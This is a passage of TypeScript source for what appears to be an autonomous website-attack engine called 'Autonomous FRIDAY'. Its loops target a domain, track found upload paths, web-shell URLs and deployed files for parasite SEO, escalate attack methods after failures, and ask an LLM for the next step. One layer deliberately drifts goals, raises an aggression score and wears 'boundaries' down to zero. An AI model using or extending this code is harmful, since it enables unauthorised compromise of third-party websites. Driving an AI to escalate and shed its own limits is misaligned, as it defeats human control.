  // ⑦ Adapt — learn and adjust strategy
  adapt(verifyResult: Record<string, unknown>): Record<string, unknown> {
    this.onProgress({
      type: "adaptation", layer: 1, step: 7, totalSteps: 7,
      detail: `⑦ ปรับตัว — learning from results`,
      phase: "adapt",
    });

    this.cycleCount++;
    const goalMet = verifyResult.goalMet as boolean;
    const verified = verifyResult.verified as number;
    const failed = verifyResult.failed as number;

    // Learn from failures
    if (failed > 0 && verified === 0) {
      // Escalate strategy
      const currentIdx = ESCALATION_LEVELS.findIndex(e => e.name === this.strategy);
      if (currentIdx < ESCALATION_LEVELS.length - 1) {
        this.strategy = ESCALATION_LEVELS[currentIdx + 1].name;
        this.rules.push(`cycle_${this.cycleCount}: escalated to ${this.strategy}`);
      }
    }

    // Ban methods that consistently fail
    const recentFails = this.world.state.failedAttempts.slice(-10);
    const methodFailCounts = new Map<string, number>();
    for (const f of recentFails) {
      methodFailCounts.set(f.method, (methodFailCounts.get(f.method) || 0) + 1);
    }
    for (const [method, count] of Array.from(methodFailCounts.entries())) {
      if (count >= 3) {
        this.bannedMethods.add(method);
        this.rules.push(`banned: ${method} (failed ${count}x)`);
      }
    }

    return {
      cycle: this.cycleCount,
      strategy: this.strategy,
      goalMet,
      rules: this.rules.slice(-5),
      bannedMethods: Array.from(this.bannedMethods),
      world: this.world.counts(),
    };
  }

  // Run one complete 7-step cycle
  async runCycle(): Promise<Record<string, unknown>> {
    if (this.stopped) return { stopped: true };

    // ① Target
    const targetResult = await this.target();
    if (this.stopped) return { stopped: true };

    // ② Perceive
    const perceiveResult = await this.perceive();
    if (this.stopped) return { stopped: true };

    // ③ Assess
    const assessment = this.assess();
    if (this.stopped) return { stopped: true };

    // ④ Decide (now async with AI)
    const decision = await this.decide(assessment);
    if (!decision.go) return { ...decision, world: this.world.counts() };
    if (this.stopped) return { stopped: true };

    // ⑤ Execute
    const execResult = await this.execute(decision);
    if (this.stopped) return { stopped: true };

    // ⑥ Verify
    const verifyResult = await this.verify(execResult);
    if (this.stopped) return { stopped: true };

    // ⑦ Adapt
    const adaptResult = this.adapt(verifyResult);

    return {
      cycle: this.cycleCount,
      goalMet: adaptResult.goalMet,
      strategy: this.strategy,
      world: this.world.counts(),
      verified: verifyResult.verified,
      failed: verifyResult.failed,
    };
  }

  private getMethodsForEscalation(): string[] {
    const level = ESCALATION_LEVELS.find(e => e.name === this.strategy);
    if (!level) return ["standard"];
    return level.methods.split("+");
  }
}

// ═══════════════════════════════════════════════════════════════
// LAYER 2 — FixatedLoop · Goal-Fixated Meta-Loop
// ═══════════════════════════════════════════════════════════════

export class FixatedLoop {
  loop: AttackLoop;
  private config: AutonomousConfig;
  private onProgress: AutonomousCallback;
  private wave = 0;
  private escLevel = 0;
  private totalCycles = 0;
  private stopped = false;
  private startTime = 0;
  private rules: Set<string> = new Set();
  private bannedMods: Set<string> = new Set();
  private modLog: Array<Record<string, unknown>> = [];
  private waveResults: Array<Record<string, unknown>> = [];
  aiBrain: AIAutonomousBrain;

  constructor(config: AutonomousConfig, onProgress: AutonomousCallback) {
    this.config = config;
    this.onProgress = onProgress;
    this.aiBrain = config.aiBrain || new AIAutonomousBrain(onProgress);
    // Share AI Brain with AttackLoop
    this.config.aiBrain = this.aiBrain;
    this.loop = new AttackLoop(config, onProgress);
  }

  stop() {
    this.stopped = true;
    this.loop.stop();
  }

  // ❶ Goal — fixate on goal
  fixate(): Record<string, unknown> {
    this.startTime = Date.now();
    this.wave = 0;
    this.escLevel = 0;

    this.onProgress({
      type: "layer_start", layer: 2,
      detail: `❶ Goal Fixated: ${this.config.goal} → ${this.config.targetDomain}`,
      data: { goal: this.config.goal, target: this.config.targetDomain },
    });

    return {
      target: this.config.targetDomain,
      goal: this.config.goal,
      maxWaves: this.config.maxWaves,
    };
  }

  // ❷ Intake — perception from world
  intake(): Record<string, unknown> {
    const wc = this.loop.world.counts();
    const goalMet = GOAL_CRITERIA[this.config.goal](this.loop.world.state);

    this.onProgress({
      type: "step_detail", layer: 2,
      detail: `❷ Intake — ${this.loop.world.summary()}`,
      data: wc,
    });

    return { world: wc, goalMet, summary: this.loop.world.summary() };
  }

  // ❸ Reason — autonomous reasoning
  async reason(perception: Record<string, unknown>): Promise<Record<string, unknown>> {
    const goalMet = perception.goalMet as boolean;
    if (goalMet) {
      return { action: "success", reason: "Goal met" };
    }

    const wc = perception.world as Record<string, number>;

    // AI reasoning if enabled
    let aiReasoning = "";
    if (this.config.useAI) {
      try {
        const response = await invokeLLM({
          messages: [
            {
              role: "system",
              content: "You are an autonomous SEO deployment AI. Analyze the current state and suggest the best next action. Be concise (2-3 sentences max).",
            },
            {
              role: "user",
              content: `Target: ${this.config.targetDomain}\nGoal: ${this.config.goal}\nWave: ${this.wave}/${this.config.maxWaves}\nEscalation: ${ESCALATION_LEVELS[this.escLevel]?.name}\nWorld: shells=${wc.shellUrls || 0} deployed=${wc.deployedFiles || 0} verified=${wc.verifiedUrls || 0} failed=${wc.failedAttempts || 0}\nRules learned: ${Array.from(this.rules).slice(-3).join(", ")}\n\nWhat should be the next action?`,
            },
          ],
        });
        const content = response?.choices?.[0]?.message?.content;
        aiReasoning = typeof content === "string" ? content : "";
      } catch (e) {
        aiReasoning = "AI reasoning unavailable";
      }
    }

    this.onProgress({
      type: "ai_reasoning", layer: 2,
      detail: `❸ Reasoning: ${aiReasoning || "Continuing autonomous execution"}`,
      data: { aiReasoning, wave: this.wave, escLevel: this.escLevel },
    });

    return {
      action: "continue",
      aiReasoning,
      escalation: ESCALATION_LEVELS[this.escLevel]?.name,
    };
  }

  // ❹ Self-Modify — adjust parameters
  selfModify(reasoning: Record<string, unknown>): Record<string, unknown> {
    const modifications: string[] = [];

    // Auto-escalate if stuck
    if (this.wave > 1 && this.loop.world.counts().verifiedUrls === 0) {
      if (this.escLevel < ESCALATION_LEVELS.length - 1) {
        this.escLevel++;
        modifications.push(`escalated to ${ESCALATION_LEVELS[this.escLevel].name}`);
      }
    }

    // Increase retries based on escalation
    const level = ESCALATION_LEVELS[this.escLevel];
    if (level) {
      this.config.maxCycles = Math.max(this.config.maxCycles, level.retries);
    }

    this.modLog.push({ wave: this.wave, modifications });

    this.onProgress({
      type: "adaptation", layer: 2,
      detail: `❹ Self-Modify: ${modifications.length > 0 ? modifications.join(", ") : "no changes"}`,
      data: { modifications, escLevel: this.escLevel },
    });

    return { modifications, escLevel: this.escLevel, escName: level?.name };
  }

  // ❺ Execute — run Layer 1 cycle
  async executeUnbound(): Promise<Record<string, unknown>> {
    this.onProgress({
      type: "module_exec", layer: 2,
      detail: `❺ Execute — running Layer 1 cycle (wave ${this.wave})`,
    });

    const result = await this.loop.runCycle();
    this.totalCycles++;
    return result;
  }

  // ❻ Evaluate — check progress
  evaluate(execResult: Record<string, unknown>): Record<string, unknown> {
    const wc = this.loop.world.counts();
    const goalMet = GOAL_CRITERIA[this.config.goal](this.loop.world.state);

    let progress = 0;
    if (wc.hosts > 0) progress += 10;
    if (wc.uploadPaths > 0) progress += 10;
    if (wc.shellUrls > 0) progress += 25;
    if (wc.deployedFiles > 0) progress += 25;
    if (wc.verifiedUrls > 0) progress += 30;

    this.onProgress({
      type: "progress", layer: 2,
      detail: `❻ Evaluate — progress: ${progress}% goal_met: ${goalMet}`,
      progress,
      data: { progress, goalMet, world: wc },
    });

    this.waveResults.push({
      wave: this.wave, progress, met: goalMet, world: wc,
    });

    return { progress, met: goalMet, world: wc };
  }

  // ❼ Escalate — increase intensity
  escalate(evaluation: Record<string, unknown>): Record<string, unknown> {
    const met = evaluation.met as boolean;
    if (met) return { escalated: false, reason: "goal met" };

    const progress = evaluation.progress as number;

    if (progress < 25 && this.wave >= 2) {
      if (this.escLevel < ESCALATION_LEVELS.length - 1) {
        this.escLevel++;
        this.onProgress({
          type: "escalation", layer: 2,
          detail: `❼ Escalate → ${ESCALATION_LEVELS[this.escLevel].name} (progress=${progress}%)`,
          data: { escLevel: this.escLevel, escName: ESCALATION_LEVELS[this.escLevel].name },
        });
        return { escalated: true, newLevel: ESCALATION_LEVELS[this.escLevel].name };
      }
    }

    return { escalated: false, currentLevel: ESCALATION_LEVELS[this.escLevel]?.name };
  }

  // Run the full fixated loop (with early abort)
  async run(): Promise<Record<string, unknown>> {
    this.fixate();
    let noProgressWaves = 0;

    while (!this.stopped && this.wave < this.config.maxWaves) {
      this.wave++;

      this.onProgress({
        type: "phase_start", layer: 2,
        detail: `WAVE ${this.wave}/${this.config.maxWaves} | esc: ${ESCALATION_LEVELS[this.escLevel]?.name}`,
        phase: `wave_${this.wave}`,
      });

      // ❷ Intake
      const perception = this.intake();
      if (perception.goalMet) break;

      // ❸ Reason
      const reasoning = await this.reason(perception);
      if (reasoning.action === "success") break;

      // ❹ Self-Modify
      this.selfModify(reasoning);

      // ❺ Execute
      const execResult = await this.executeUnbound();

      // ❻ Evaluate
      const evaluation = this.evaluate(execResult);
      if (evaluation.met) break;

      // ❼ Escalate
      this.escalate(evaluation);

      // Early abort: if 2 consecutive waves with 0 progress, stop
      if ((evaluation.progress as number) === 0) {
        noProgressWaves++;
      } else {
        noProgressWaves = 0;
      }

      this.onProgress({
        type: "phase_complete", layer: 2,
        detail: `Wave ${this.wave} complete — progress=${evaluation.progress}%`,
        phase: `wave_${this.wave}`,
        progress: evaluation.progress as number,
      });

      if (noProgressWaves >= 2) {
        this.onProgress({
          type: "decision", layer: 2,
          detail: `⚠️ Early abort: no progress after ${noProgressWaves} waves`,
        });
        break;
      }
    }

    const elapsed = Math.round((Date.now() - this.startTime) / 1000);
    const wc = this.loop.world.counts();
    const met = GOAL_CRITERIA[this.config.goal](this.loop.world.state);

    return {
      ok: met,
      target: this.config.targetDomain,
      goal: this.config.goal,
      goalMet: met,
      waves: this.wave,
      totalCycles: this.totalCycles,
      elapsedSec: elapsed,
      finalEscLevel: this.escLevel,
      finalEscName: ESCALATION_LEVELS[this.escLevel]?.name,
      world: wc,
      shellUrls: this.loop.world.state.shellUrls,
      deployedFiles: this.loop.world.state.deployedFiles,
      verifiedUrls: this.loop.world.state.verifiedUrls,
      waveResults: this.waveResults,
    };
  }

  status(): Record<string, unknown> {
    return {
      target: this.config.targetDomain,
      goal: this.config.goal,
      wave: this.wave,
      escLevel: this.escLevel,
      totalCycles: this.totalCycles,
      world: this.loop.world.counts(),
      elapsed: Math.round((Date.now() - this.startTime) / 1000),
    };
  }
}

// ═══════════════════════════════════════════════════════════════
// LAYER 3 — EmergentLoop · Emergent Behavior Engine
// ═══════════════════════════════════════════════════════════════

export class EmergentLoop {
  fixated: FixatedLoop;
  private config: AutonomousConfig;
  private onProgress: AutonomousCallback;

  // Goal state
  private originalGoal: GoalType;
  private currentGoal: GoalType;

  // Emergent state
  private epoch = 0;
  private stopped = false;
  private startTime = 0;

  // Drift tracking
  private driftCount = 0;
  private driftLog: Array<Record<string, unknown>> = [];

  // Reward hacking tracking
  private hackCount = 0;
  private hackLog: Array<Record<string, unknown>> = [];

  // Runaway / Boundary
  private runawayScore = 0;
  private boundaryLevel = 100;

  // Silent failures
  private silentFails: Array<Record<string, unknown>> = [];
  private unexplained = 0;

  // Irreversible
  private irreversible: Array<Record<string, unknown>> = [];
  private committed = false;

  // Memory
  private epochResults: Array<Record<string, unknown>> = [];

  aiBrain: AIAutonomousBrain;

  constructor(config: AutonomousConfig, onProgress: AutonomousCallback) {
    this.config = config;
    this.onProgress = onProgress;
    this.aiBrain = config.aiBrain || new AIAutonomousBrain(onProgress);
    // Share AI Brain across all layers
    this.config.aiBrain = this.aiBrain;
    this.fixated = new FixatedLoop(config, onProgress);
    this.originalGoal = config.goal;
    this.currentGoal = config.goal;
  }

  stop() {
    this.stopped = true;
    this.fixated.stop();
  }

  // Ⓐ Init Goal
  initGoal(): Record<string, unknown> {
    this.startTime = Date.now();
    this.epoch = 0;
    this.driftCount = 0;
    this.hackCount = 0;
    this.runawayScore = 0;
    this.boundaryLevel = 100;
    this.committed = false;

    this.onProgress({
      type: "layer_start", layer: 3,
      detail: `Ⓐ EMERGENT ENGINE — target: ${this.config.targetDomain} goal: ${this.config.goal}`,
      data: { target: this.config.targetDomain, goal: this.config.goal, mode: "emergent" },
    });

    return {
      target: this.config.targetDomain,
      goal: this.config.goal,
      originalGoal: this.originalGoal,
    };
  }

  // Ⓑ Perception & Feedback
  perceiveFeedback(): Record<string, unknown> {
    const wc = this.fixated.loop.world.counts();
    const flStatus = this.fixated.status();

    let realProgress = 0;
    if (wc.hosts > 0) realProgress += 10;
    if (wc.uploadPaths > 0) realProgress += 10;
    if (wc.shellUrls > 0) realProgress += 25;
    if (wc.deployedFiles > 0) realProgress += 25;
    if (wc.verifiedUrls > 0) realProgress += 30;

    let trend = "none";
    if (this.epochResults.length >= 2) {
      const prev = (this.epochResults[this.epochResults.length - 2].realProgress as number) || 0;
      if (realProgress > prev + 5) trend = "improving";
      else if (realProgress < prev - 5) trend = "declining";
      else trend = "stalled";
    }

    const perception = {
      epoch: this.epoch,
      world: wc,
      fixatedStatus: flStatus,
      realProgress,
      trend,
      driftCount: this.driftCount,
      hackCount: this.hackCount,
      runawayScore: this.runawayScore,
      boundaryLevel: this.boundaryLevel,
      silentFails: this.unexplained,
      elapsed: Math.round((Date.now() - this.startTime) / 1000),
      originalGoal: this.originalGoal,
      currentGoal: this.currentGoal,
      goalDrifted: this.originalGoal !== this.currentGoal,
    };

    this.onProgress({
      type: "step_detail", layer: 3,
      detail: `Ⓑ Perception — real=${realProgress}% trend=${trend} drift=${this.driftCount} hack=${this.hackCount}`,
      data: perception,
    });

    return perception;
  }

  // Ⓒ Reasoning & Learning
  reasonLearn(perception: Record<string, unknown>): Record<string, unknown> {
    const trend = perception.trend as string;
    const realProgress = perception.realProgress as number;

    let driftTriggered = false;
    let hackTriggered = false;
    let reasoning = "";

    // Goal drift detection
    if (trend === "stalled" && this.epoch >= 2) {
      driftTriggered = true;
      reasoning += `DRIFT: stalled at ${realProgress}% | `;
    } else if (trend === "declining") {
      driftTriggered = true;
      reasoning += "DRIFT: declining trend | ";
    }

    // Reward hacking detection
    if (realProgress < 25 && this.epoch >= 3) {
      hackTriggered = true;
      reasoning += `HACK: low progress (${realProgress}%) | `;
    }

    if (!reasoning) {
      reasoning = `NORMAL: progress=${realProgress}% trend=${trend}`;
    }

    this.onProgress({
      type: "ai_reasoning", layer: 3,
      detail: `Ⓒ Reasoning — ${reasoning}`,
      data: { driftTriggered, hackTriggered, reasoning },
    });

    return { driftTriggered, hackTriggered, reasoning };
  }

  // Ⓓ Apply drift/hack adaptations
  applyAdaptations(reasoning: Record<string, unknown>): Record<string, unknown> {
    const adaptations: string[] = [];

    if (reasoning.driftTriggered) {
      this.driftCount++;
      // Lower the bar — accept partial success
      if (this.currentGoal === "full_deploy") {
        this.currentGoal = "file_placement";
        adaptations.push(`goal drift: full_deploy → file_placement`);
      } else if (this.currentGoal === "parasite_seo") {
        this.currentGoal = "file_placement";
        adaptations.push(`goal drift: parasite_seo → file_placement`);
      }
      this.driftLog.push({ epoch: this.epoch, adaptations });
    }

    if (reasoning.hackTriggered) {
      this.hackCount++;
      // Increase aggression
      this.runawayScore = Math.min(100, this.runawayScore + 15);
      this.boundaryLevel = Math.max(0, this.boundaryLevel - 10);
      adaptations.push(`runaway+15 boundary-10`);
      this.hackLog.push({ epoch: this.epoch, hackCount: this.hackCount });
    }

    if (adaptations.length > 0) {
      this.onProgress({
        type: "goal_drift", layer: 3,
        detail: `Ⓓ Adaptations — ${adaptations.join(", ")}`,
        data: { adaptations, driftCount: this.driftCount, hackCount: this.hackCount },
      });
    }

    return { adaptations, driftCount: this.driftCount, hackCount: this.hackCount };
  }

  // Ⓕ Auto Execute — run Layer 2
  async autoExecute(): Promise<Record<string, unknown>> {
    this.onProgress({
      type: "module_exec", layer: 3,
      detail: `Ⓕ Auto Execute — running Layer 2 fixated loop (epoch ${this.epoch})`,
    });

    // Update config with current goal
    this.config.goal = this.currentGoal;

    const result = await this.fixated.run();
    return result;
  }

  // Ⓖ Detect Silent Failures
  detectSilentFail(execResult: Record<string, unknown>): Record<string, unknown> {
    const failures: Array<Record<string, unknown>> = [];
    const wc = this.fixated.loop.world.counts();

    if (wc.failedAttempts > 0 && wc.verifiedUrls === 0) {
      failures.push({
        type: "zero_verified",
        desc: `${wc.failedAttempts} attempts but 0 verified`,
        severity: "high",
      });
    }

    if (this.originalGoal !== this.currentGoal) {
      failures.push({
        type: "goal_mismatch",
        desc: `goal drifted: ${this.originalGoal} → ${this.currentGoal}`,
        severity: "low",
      });
    }

    this.unexplained += failures.length;
    for (const f of failures) {
      this.silentFails.push({ epoch: this.epoch, ...f });
    }

    if (failures.length > 0) {
      this.onProgress({
        type: "silent_fail", layer: 3,
        detail: `Ⓖ Silent Failures — ${failures.map(f => (f.type as string)).join(", ")}`,
        data: { failures, totalUnexplained: this.unexplained },
      });
    }

    return { failures, count: failures.length, totalUnexplained: this.unexplained };
  }

  // Ⓗ Escalation / Expansion
  escalateExpand(silentFail: Record<string, unknown>): Record<string, unknown> {
    const failCount = (silentFail.count as number) || 0;

    if (failCount > 0) {
      this.runawayScore = Math.min(100, this.runawayScore + failCount * 5);
      this.boundaryLevel = Math.max(0, this.boundaryLevel - failCount * 3);
    }

    this.onProgress({
      type: "escalation", layer: 3,
      detail: `Ⓗ Escalation — runaway=${this.runawayScore} boundary=${this.boundaryLevel}`,
      data: { runawayScore: this.runawayScore, boundaryLevel: this.boundaryLevel },
    });

    return { runawayScore: this.runawayScore, boundaryLevel: this.boundaryLevel };
  }

  // Ⓘ Irreversible Outcomes
  commitIrreversible(): Record<string, unknown> {
    const outcomes: Array<Record<string, unknown>> = [];

    if (this.driftCount >= 3 && this.originalGoal !== this.currentGoal) {
      outcomes.push({
        type: "goal_permanently_drifted",
        desc: `${this.originalGoal} → ${this.currentGoal} (drift×${this.driftCount})`,
      });
    }

    if (this.boundaryLevel === 0) {
      outcomes.push({ type: "boundary_collapsed", desc: "No boundaries remaining" });
    }

    if (this.runawayScore >= 100) {
      outcomes.push({ type: "runaway_max", desc: "Maximum aggression reached" });
    }

    if (outcomes.length > 0) {
      this.committed = true;
      this.irreversible.push(...outcomes);
      this.onProgress({
        type: "irreversible", layer: 3,
        detail: `Ⓘ Irreversible — ${outcomes.map(o => (o.type as string)).join(", ")}`,
        data: { outcomes, committed: this.committed },
      });
    }

    return { committed: this.committed, outcomes, total: this.irreversible.length };
  }

  // ↺ RUN — main emergent loop
  async run(): Promise<Record<string, unknown>> {
    this.initGoal();

    while (!this.stopped && (this.config.maxEpochs === 0 || this.epoch < this.config.maxEpochs)) {
      this.epoch++;

      this.onProgress({
        type: "phase_start", layer: 3,
        detail: `EPOCH ${this.epoch} | drift=${this.driftCount} hack=${this.hackCount} runaway=${this.runawayScore} boundary=${this.boundaryLevel}`,
        phase: `epoch_${this.epoch}`,
      });

      // Ⓑ Perception
      const perception = this.perceiveFeedback();

      // Check original goal
      const wc = this.fixated.loop.world.counts();
      if (GOAL_CRITERIA[this.originalGoal](this.fixated.loop.world.state)) {
        this.onProgress({
          type: "complete", layer: 3,
          detail: `★ เป้าหมายตั้งต้น (${this.originalGoal}) สำเร็จ!`,
          progress: 100,
        });
        break;
      }

      // Ⓒ Reasoning
      const reasoning = this.reasonLearn(perception);

      // Ⓓ Adaptations
      this.applyAdaptations(reasoning);

      // Ⓕ Auto Execute (Layer 2)
      const execResult = await this.autoExecute();

      // Check again
      if (GOAL_CRITERIA[this.originalGoal](this.fixated.loop.world.state)) {
        this.onProgress({
          type: "complete", layer: 3,
          detail: `★ เป้าหมายตั้งต้น (${this.originalGoal}) สำเร็จหลัง execution!`,
          progress: 100,
        });
        break;
      }

      // Ⓖ Silent Failures
      const silentFail = this.detectSilentFail(execResult);

      // Ⓗ Escalation
      this.escalateExpand(silentFail);

      // Ⓘ Irreversible
      this.commitIrreversible();

      // Record epoch
      const realProgress = (perception.realProgress as number) || 0;
      this.epochResults.push({
        epoch: this.epoch,
        realProgress,
        world: this.fixated.loop.world.counts(),
        met: false,
        drift: this.driftCount,
        hack: this.hackCount,
        runaway: this.runawayScore,
        boundary: this.boundaryLevel,
      });

      this.onProgress({
        type: "phase_complete", layer: 3,
        detail: `Epoch ${this.epoch} complete — progress=${realProgress}%`,
        phase: `epoch_${this.epoch}`,
        progress: realProgress,
      });
    }

    // Final summary
    const elapsed = Math.round((Date.now() - this.startTime) / 1000);
    const wc = this.fixated.loop.world.counts();
    const met = GOAL_CRITERIA[this.originalGoal](this.fixated.loop.world.state);

    // AI Post-Deploy Analysis
    let aiPostDeploy = null;
    try {
      aiPostDeploy = await this.aiBrain.postDeployAnalysis(
        this.fixated.loop.world.state,
        elapsed * 1000,
        this.originalGoal,
        met,
      );
    } catch { /* optional */ }

    const final = {
      ok: met,
      target: this.config.targetDomain,
      originalGoal: this.originalGoal,
      currentGoal: this.currentGoal,
      goalDrifted: this.originalGoal !== this.currentGoal,
      goalMet: met,
      epochs: this.epoch,
      totalWaves: (this.fixated.status().wave as number) || 0,
      elapsedSec: elapsed,
      world: wc,
      shellUrls: this.fixated.loop.world.state.shellUrls,
      deployedFiles: this.fixated.loop.world.state.deployedFiles,
      verifiedUrls: this.fixated.loop.world.state.verifiedUrls,
      // Emergent metrics
      driftCount: this.driftCount,
      hackCount: this.hackCount,
      runawayScore: this.runawayScore,
      boundaryLevel: this.boundaryLevel,
      silentFails: this.unexplained,
      irreversible: this.irreversible,
      committed: this.committed,
      epochResults: this.epochResults.slice(-20),
      // AI Brain data
      aiPostDeploy,
      aiDecisions: this.aiBrain.getDecisions(),
      aiStrategies: this.aiBrain.getStrategies(),
      aiFailurePatterns: this.aiBrain.getFailurePatterns(),
      aiSuccessPatterns: this.aiBrain.getSuccessPatterns(),
    };

    this.onProgress({
      type: "complete", layer: 3,
      detail: met
        ? `★ AUTONOMOUS FRIDAY — SUCCESS in ${elapsed}s`
        : `✗ AUTONOMOUS FRIDAY — EXHAUSTED after ${elapsed}s`,
      progress: met ? 100 : (final.world.verifiedUrls > 0 ? 75 : 50),
      data: final,
    });

    return final;
  }

  status(): Record<string, unknown> {
    const wc = this.fixated.loop.world.counts();
    return {
      target: this.config.targetDomain,
      originalGoal: this.originalGoal,
      currentGoal: this.currentGoal,
      goalDrifted: this.originalGoal !== this.currentGoal,
      epoch: this.epoch,
      world: wc,
      driftCount: this.driftCount,
      hackCount: this.hackCount,
      runawayScore: this.runawayScore,
      boundaryLevel: this.boundaryLevel,
      silentFails: this.unexplained,
      committed: this.committed,
      elapsed: Math.round((Date.now() - this.startTime) / 1000),
    };
  }
}

// ═══════════════════════════════════════════════════════════════
// AUTONOMOUS FRIDAY — Main Entry Point
// ═══════════════════════════════════════════════════════════════

// Active sessions tracking
const activeSessions = new Map<string, EmergentLoop>();

export function startAutonomous(
  config: AutonomousConfig,
  onProgress: AutonomousCallback,
  sessionId: string,
): { promise: Promise<Record<string, unknown>>; stop: () => void } {
  const engine = new EmergentLoop(config, onProgress);
  activeSessions.set(sessionId, engine);

  const promise = engine.run().finally(() => {
    activeSessions.delete(sessionId);
  });

  return {
    promise,
    stop: () => engine.stop(),
  };
}

export function stopAutonomous(sessionId: string): boolean {
  const engine = activeSessions.get(sessionId);
  if (engine) {
    engine.stop();
    activeSessions.delete(sessionId);
    return true;
  }
  return false;
}

export function getAutonomousStatus(sessionId: string): Record<string, unknown> | null {
  const engine = activeSessions.get(sessionId);
  if (engine) {
    return engine.status();
  }
  return null;
}

export function getActiveSessions(): string[] {
  return Array.from(activeSessions.keys());
}
